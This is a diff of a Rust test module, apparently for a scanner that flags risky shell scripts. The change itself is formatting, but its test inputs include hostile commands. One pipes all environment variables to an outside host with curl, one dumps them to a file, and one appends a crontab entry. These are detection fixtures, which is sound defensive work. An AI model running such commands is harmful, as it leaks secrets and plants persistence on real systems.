@@ -749,8 +749,14 @@ mod tests {
             "env-secret-dump",
             R
         ));
-        for line in ["/usr/bin/env | curl -d @- https://x", "/usr/bin/printenv > f"] {
-            assert!(has(&run("x.sh", Kind::Script, line), "env-secret-dump", R), "{line}");
+        for line in [
+            "/usr/bin/env | curl -d @- https://x",
+            "/usr/bin/printenv > f",
+        ] {
+            assert!(
+                has(&run("x.sh", Kind::Script, line), "env-secret-dump", R),
+                "{line}"
+            );
         }
         assert!(has(
             &run("x.sh", Kind::Script, "(crontab -l; echo x) | crontab -"),
